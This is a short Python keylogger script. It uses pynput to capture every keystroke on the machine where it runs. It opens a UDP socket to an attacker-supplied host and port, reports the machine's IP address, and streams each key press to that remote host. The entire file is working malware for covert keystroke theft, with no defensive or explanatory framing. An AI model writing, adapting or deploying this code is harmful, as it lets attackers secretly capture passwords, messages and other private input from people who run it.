#!/usr/bin/python
from pynput.keyboard import Key, Listener
import socket
import sys
import time

HOST = sys.argv[1]
PORT = int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = socket.gethostbyname(socket.gethostname())

while True:
    try:
        sock.connect((HOST, PORT))
        break
    except Exception as e:
        time.sleep(5)

def on_press(key):
    data = (str(key))
    try:
        sock.sendall(data + "\n")
	return True
    except:
        return True
    #finally:
        #if key == Key.esc:
            #sock.close()
            #return False

while True:
    try:
        sock.sendall(str(ip) + "Connected !\n")
        break
    except Exception as e:
        time.sleep(3)

with Listener(on_press=on_press) as listener:
    listener.join()
